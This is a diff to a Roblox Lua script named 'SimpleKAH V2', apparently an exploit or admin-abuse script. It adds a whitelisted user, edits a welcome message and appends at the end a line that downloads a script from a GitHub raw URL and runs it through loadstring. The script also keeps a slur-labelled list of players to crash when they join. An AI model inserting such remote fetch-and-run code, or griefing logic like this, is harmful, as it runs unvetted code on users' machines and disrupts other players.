@@ -45,7 +45,7 @@ local bpunish = false
 local lpowner = false
 local Ownerhere = true
 local lpname = lp.Name
-local whitelist = {"Raysdamain", "asechka198720", "asechka19872"}
+local whitelist = {"Raysdamain", "asechka198720", "asechka19872", "ScriptingProgrammer"}
 local crashonretardjoin = true
 local retards = {"someguylmao"}
 
@@ -140,7 +140,7 @@ end
 
 local function adplr(player)
 
-    h("\n\n\n Welcome to the server, "..tostring(player.Name).."\n\n\n")
+    h("\n\n\n [SimpleKAH]: Welcome to the server, "..tostring(player.Name).."\n\n\n")
 
 end
 ----
@@ -642,4 +642,6 @@ end
 
 -- Autoexecute
 wait(3)
-h("\n\n\n The SimpleKAH V2 script has loaded - the owner is "..tostring(ScrOwner).."\n\n\n")
+h("\n\n\n The SimpleKAH V2 script has loaded - the owner is "..tostring(ScrOwner).." \n\n\n")
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lnfiniteCoder/My-roblox-scripts/main/General_Scripts_D_E_L_T_A.txt"))()
